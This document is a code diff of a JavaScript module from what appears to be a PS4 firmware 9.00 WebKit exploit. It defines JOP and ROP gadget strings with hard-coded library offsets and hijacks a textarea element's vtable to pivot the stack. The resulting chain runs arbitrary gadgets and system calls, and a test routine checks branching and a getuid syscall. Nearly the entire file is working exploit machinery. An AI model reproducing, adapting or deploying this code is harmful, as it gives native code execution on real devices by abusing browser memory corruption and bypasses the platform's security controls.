@@ -17,13 +17,13 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
 // by janisslsm (John) from ps4-dev discord
 
-import * as config from '../config.mjs';
+import * as config from '/config.mjs';
 
-import { Int } from '../module/int64.mjs';
-import { debug_log, die } from '../module/utils.mjs';
-import { Addr, mem } from '../module/mem.mjs';
-import { KB, MB } from '../module/constants.mjs';
-import { ChainBase } from '../module/chain.mjs';
+import { Int } from '/module/int64.mjs';
+import { log, align, die } from '/module/utils.mjs';
+import { Addr, mem } from '/module/mem.mjs';
+import { KB, MB } from '/module/constants.mjs';
+import { ChainBase } from '/module/chain.mjs';
 
 import {
     make_buffer,
@@ -31,10 +31,10 @@ import {
     get_view_vector,
     resolve_import,
     init_syscall_array,
-} from '../module/memtools.mjs';
+} from '/module/memtools.mjs';
 
-import * as rw from '../module/rw.mjs';
-import * as o from '../module/offset.mjs';
+import * as rw from '/module/rw.mjs';
+import * as o from '/module/offset.mjs';
 
 const origin = window.origin;
 const port = '8000';
@@ -42,7 +42,9 @@ const url = `${origin}:${port}`;
 
 const syscall_array = [];
 
+const offset_func_exec = 0x18;
 const offset_textarea_impl = 0x18;
+const offset_js_inline_prop = 0x10;
 
 // WebKit offsets of imported functions
 const offset_wk_stack_chk_fail = 0x178;
@@ -66,55 +68,64 @@ let setjmp_addr = null;
 let longjmp_addr = null;
 
 // libSceNKWebKit.sprx
-let libwebkit_base = null;
+export let libwebkit_base = null;
 // libkernel_web.sprx
-let libkernel_base = null;
+export let libkernel_base = null;
 // libSceLibcInternal.sprx
-let libc_base = null;
+export let libc_base = null;
 
-// Chain implementation based on Chain800. Replaced offsets that changed
+// Chain implementation based on Chain803. Replaced offsets that changed
 // between versions. Replaced gadgets that were missing with new ones that
 // won't change the API.
-
+//
 // gadgets for the JOP chain
+//
+// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+// because jop1-5 was the original chain used by the old implementation of
+// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
 //
 // When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
-const jop1 = `
-mov rdi, qword ptr [rsi + 0x20]
+const ta_jop1 = `
+mov rdi, qword ptr [rsi + 0x18]
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x28]
+call qword ptr [rax + 0xb8]
 `;
 // Since the method of code redirection we used is via redirecting a call to
 // jump to our JOP chain, we have the return address of the caller on entry.
 //
-// jop1 pushed another object (via the call instruction) but we want no extra
-// objects between the return address and the rbp that will be pushed by jop3
-// later. So we pop the return address pushed by jop1.
+// ta_jop1 pushed another object (via the call instruction) but we want no
+// extra objects between the return address and the rbp that will be pushed by
+// jop2 later. So we pop the return address pushed by ta_jop1.
 //
 // This will make pivoting back easy, just "leave; ret".
-const jop2 = `
-pop rcx
-jmp qword ptr [rax + 0x7d]
+const ta_jop2 = `
+pop rsi
+jmp qword ptr [rax + 0x1c]
+`;
+const ta_jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x30]
 `;
 // rbp is now pushed, any extra objects pushed by the call instructions can be
 // ignored
-const jop3 = `
+const jop2 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x58]
 `;
-const jop4 = `
+const jop3 = `
 mov rdx, qword ptr [rax + 0x18]
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x10]
 `;
-const jop5 = `
+const jop4 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop6 = 'pop rsp; ret';
+const jop5 = 'pop rsp; ret';
 
 // the ps4 firmware is compiled to use rbp as a frame pointer
 //
@@ -129,11 +140,6 @@ const jop6 = 'pop rsp; ret';
 //     mov rsp, rbp
 //     pop rbp
 const rop_epilogue = 'leave; ret';
-
-const push_rdx_jmp = `
-push rdx
-jmp qword ptr [rax]
-`;
 
 const webkit_gadget_offsets = new Map(Object.entries({
     'pop rax; ret' : 0x0000000000051a12,
@@ -162,22 +168,27 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'neg rax; and rax, rcx; ret' : 0x00000000019771c4,
     'adc esi, esi; ret' : 0x000000000148874e,
     'add rax, rdx; ret' : 0x00000000003f662c,
+    'push rsp; jmp qword ptr [rax]' : 0x0000000002bae87f,
     'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000001b1ed66,
     'pop rsi; jmp qword ptr [rax + 0x1c]' : 0x00000000021fce7e,
 
     'mov qword ptr [rdi], rsi; ret' : 0x0000000000040300,
     'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc,
     'mov qword ptr [rdi], rax; ret' : 0x000000000000613b,
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
     'mov rdx, rcx; ret' : 0x000000000157fe71,
 
-    [push_rdx_jmp] : 0x00000000028bd332,
+    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482,
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
 
-    [jop1] : 0x0000000000f2c778,
-    [jop2] : 0x0000000002c326c2,
-    [jop3] : 0x0000000000683800,
-    [jop4] : 0x0000000000303906,
-    [jop5] : 0x00000000028bd332,
-    [jop6] : 0x000000000004e293,
+    [jop2] : 0x0000000000683800,
+    [jop3] : 0x0000000000303906,
+    [jop4] : 0x00000000028bd332,
+    [jop5] : 0x000000000004e293,
+
+    [ta_jop1] : 0x00000000004e62a4,
+    [ta_jop2] : 0x00000000021fce7e,
+    [ta_jop3] : 0x00000000019becb4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
@@ -186,9 +197,16 @@ const libc_gadget_offsets = new Map(Object.entries({
     'mov qword ptr [rsi], rcx; ret' : 0x00000000000cf982,
     'setjmp' : offset_libc_setjmp,
     'longjmp' : offset_libc_longjmp,
+    //'getcontext' : 0x258f4,
+    'setcontext' : 0x638,
 }));
 
-const gadgets = new Map();
+const libkernel_gadget_offsets = new Map(Object.entries({
+    // returns the location of errno
+    '__error' : 0xCB80,
+}));
+
+export const gadgets = new Map();
 
 function get_bases() {
     const textarea = document.createElement('textarea');
@@ -200,11 +218,15 @@ function get_bases() {
         libwebkit_base
         .add(offset_wk_stack_chk_fail)
     ;
-    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
+    const stack_chk_fail_addr = resolve_import(
+        stack_chk_fail_import,
+        true,
+        true
+    );
     const libkernel_base = find_base(stack_chk_fail_addr, true, true);
 
     const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
-    const memcpy_addr = resolve_import(memcpy_import);
+    const memcpy_addr = resolve_import(memcpy_import, true, true);
     const libc_base = find_base(memcpy_addr, true, true);
 
     return [
@@ -214,7 +236,7 @@ function get_bases() {
     ];
 }
 
-function init_gadget_map(gadget_map, offset_map, base_addr) {
+export function init_gadget_map(gadget_map, offset_map, base_addr) {
     for (const [insn, offset] of offset_map) {
         gadget_map.set(insn, base_addr.add(offset));
     }
@@ -229,11 +251,13 @@ class Chain900Base extends ChainBase {
         this.flag = new Uint8Array(8);
         this.flag_addr = get_view_vector(this.flag);
         this.jmp_target = new Uint8Array(0x100);
-        rw.write64(this.jmp_target, 0x1c, this.get_gadget(push_rdx_jmp));
-        rw.write64(this.jmp_target, 0, this.get_gadget('pop rsp; ret'));
+        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
+        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
 
         // for save/restore
         this.is_saved = false;
+        this.is_stale = false;
+        this.position = 0;
         const jmp_buf_size = 0xc8;
         this.jmp_buf = new Uint8Array(jmp_buf_size);
         this.jmp_buf_p = get_view_vector(this.jmp_buf);
@@ -270,6 +294,7 @@ class Chain900Base extends ChainBase {
         super.clean();
         this._clean_branch_ctx();
         this.is_saved = false;
+        this.is_stale = false;
     }
 
     // Use start_branch() and end_branch() to delimit a ROP chain that will
@@ -449,8 +474,6 @@ class Chain900Base extends ChainBase {
         this.push_end();
         this.run();
         this.clean();
-
-        return this.return_value;
     }
 
     syscall(...args) {
@@ -462,79 +485,78 @@ class Chain900Base extends ChainBase {
         this.push_end();
         this.run();
         this.clean();
+    }
 
-        return this.return_value;
+        push_clear_errno() {
+        this.push_call(this.get_gadget('__error'));
+        this.push_gadget('pop rsi; ret');
+        this.push_value(0);
+        this.push_gadget('mov dword ptr [rax], esi; ret');
+    }
+
+        push_get_errno() {
+        this.push_gadget('pop rdi; ret');
+        this.push_value(this.errno_addr);
+
+        this.push_call(this.get_gadget('__error'));
+
+        this.push_gadget('mov rax, qword ptr [rax]; ret');
+        this.push_gadget('mov dword ptr [rdi], eax; ret');
+    }
+
+        check_stale() {
+        if (this.is_stale) {
+            throw Error('chain already ran, clean it first');
+        }
+        this.is_stale = true;
+    }
+        check_is_empty() {
+        if (this.position === 0) {
+            throw Error('chain is empty');
+        }
     }
 }
 
-// helper object for ROP
-const rop_ta = document.createElement('textarea');
-
 // Chain for PS4 9.00
-class Chain900 extends Chain900Base {
+export class Chain900 extends Chain900Base {
     constructor() {
         super();
 
-        // sizeof JSC:JSObject, the JSCell + the butterfly field
-        const js_size = 0x10;
-        // sizeof WebCore::JSHTMLTextAreaElement, subclass of JSObject
-        const js_ta_size = 0x20;
-        // start of the array of inline properties (JSValues)
-        const offset_js_inline_prop = 0x10;
-        // Sizes may vary between webkit versions so we just assume a size
-        // that we think is large enough for all of them.
-        const vtable_size = 0x1000;
-        const webcore_ta_size = 0x180;
-
-        const ta_clone = {};
-        this.ta_clone = ta_clone;
-        const clone_p = mem.addrof(ta_clone);
-        const ta_p = mem.addrof(rop_ta);
-
-        for (let i = js_size; i < js_ta_size; i += 8) {
-            clone_p.write64(i, ta_p.read64(i));
-        }
-
-        const webcore_ta = ta_p.readp(offset_textarea_impl);
-        const m_wrapped_clone = new Uint8Array(
-            make_buffer(webcore_ta, webcore_ta_size)
-        );
-        this.m_wrapped_clone = m_wrapped_clone;
-
-        // Replicate the vtable as much as possible or else the garbage
-        // collector will crash. It uses functions from the vtable.
+        const textarea = document.createElement('textarea');
+        this.textarea = textarea;
+        const js_ta = mem.addrof(textarea);
+        const webcore_ta = js_ta.readp(0x18);
+        this.webcore_ta = webcore_ta;
+        // Only offset 0x1c8 will be used when calling the scrollLeft getter
+        // native function (our tests don't crash).
         //
-        // There is no need to restore the original vtable pointer later since
-        // it points to a copy with only offset 0x1b8 changed. The scrollLeft
-        // getter is not used by the GC.
-        const vtable_clone = new Uint8Array(
-            make_buffer(webcore_ta.readp(0), vtable_size)
-        );
-        this.vtable_clone = vtable_clone
-
-        clone_p.write64(
-            offset_textarea_impl,
-            get_view_vector(m_wrapped_clone),
-        );
-        rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
-
-        clone_p.write64(0, ta_p.read64(0));
+        // This implies we don't need to know the exact size of the vtable and
+        // try to copy it as much as possible to avoid a crash due to missing
+        // vtable entries.
+        //
+        // So the rest of the vtable are free for our use.
+        const vtable = new Uint8Array(0x200);
+        const old_vtable_p = webcore_ta.readp(0);
+        this.vtable = vtable;
+        this.old_vtable_p = old_vtable_p;
 
         // 0x1b8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
+        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
+        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
         const rax_ptrs_p = get_view_vector(rax_ptrs);
         this.rax_ptrs = rax_ptrs;
 
-        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x7d, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
+        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
         // value to pivot rsp to
-        rw.write64(rax_ptrs, 0x18, this.stack_addr);
+        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);
 
         const jop_buffer = new Uint8Array(8);
         const jop_buffer_p = get_view_vector(jop_buffer);
@@ -542,7 +564,7 @@ class Chain900 extends Chain900Base {
 
         rw.write64(jop_buffer, 0, rax_ptrs_p);
 
-        clone_p.write64(offset_js_inline_prop + 8*2, jop_buffer_p);
+        rw.write64(vtable, 8, jop_buffer_p);
     }
 
     run() {
@@ -550,20 +572,25 @@ class Chain900 extends Chain900Base {
         this.check_is_empty();
         this.check_is_branching();
 
+        // change vtable
+        this.webcore_ta.write64(0, get_view_vector(this.vtable));
         // jump to JOP chain
-        this.ta_clone.scrollLeft;
+        this.textarea.scrollLeft;
+        // restore vtable
+        this.webcore_ta.write64(0, this.old_vtable_p);
     }
 }
-const Chain = Chain900;
+export const Chain = Chain900;
 
-function init(Chain) {
+export function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
 
     init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
     init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
     init_syscall_array(syscall_array, libkernel_base, 300 * KB);
-    debug_log('syscall_array:');
-    debug_log(syscall_array);
+    log('syscall_array:');
+    log(syscall_array);
     Chain.init_class(gadgets, syscall_array);
 }
 
@@ -585,26 +612,26 @@ function test_rop(Chain) {
 
     chain.start_branch();
 
-    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
+    log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
     chain.push_call(longjmp_addr, jmp_buf_p);
 
     chain.end_branch();
 
-    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
+    log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
     chain.push_end();
 
     // The ROP chain is a noop. If we crashed, then we did something wrong.
     alert('chain run');
-    debug_log('test call setjmp()/longjmp()');
+    log('test call setjmp()/longjmp()');
     chain.run()
     alert('returned successfully');
-    debug_log('returned successfully');
-    debug_log('jmp_buf:');
-    debug_log(jmp_buf);
-    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);
+    log('returned successfully');
+    log('jmp_buf:');
+    log(jmp_buf);
+    log(`flag: ${rw.read64(chain.flag, 0)}`);
 
     const state1 = new Uint8Array(8);
-    debug_log('test if rax == 0');
+    log('test if rax == 0');
     chain.clean();
 
     chain.push_gadget('pop rsi; ret');
@@ -630,13 +657,13 @@ function test_rop(Chain) {
     chain.push_end();
 
     chain.run();
-    debug_log(`state1 must be 1: ${state1}`);
+    log(`state1 must be 1: ${state1}`);
     if (state1[0] !== 1) {
         die('if branch not taken');
     }
 
     const state2 = new Uint8Array(8);
-    debug_log('test if rax != 0');
+    log('test if rax != 0');
     chain.clean();
 
     chain.push_gadget('pop rsi; ret');
@@ -662,24 +689,25 @@ function test_rop(Chain) {
     chain.push_end();
 
     chain.run();
-    debug_log(`state2 must be 2: ${state2}`);
+    log(`state2 must be 2: ${state2}`);
     if (state2[0] !== 2) {
         die('if branch taken');
     }
 
-    debug_log('test syscall getuid()');
+    log('test syscall getuid()');
     chain.clean();
     // Set the return value to some random value. If the syscall worked, then
     // it will likely change.
     const magic = 0x4b435546;
     rw.write32(chain._return_value, 0, magic);
 
-    const res = chain.syscall('getuid');
+    chain.syscall('getuid');
 
-    debug_log(`return value: ${res}`);
-    if (res.eq(magic)) {
+    log(`return value: ${chain.return_value}`);
+    if (chain.return_value.low() === magic) {
         die('syscall getuid failed');
     }
 }
 
-test_rop(Chain);
+log('Chain900');
+//test_rop(Chain);
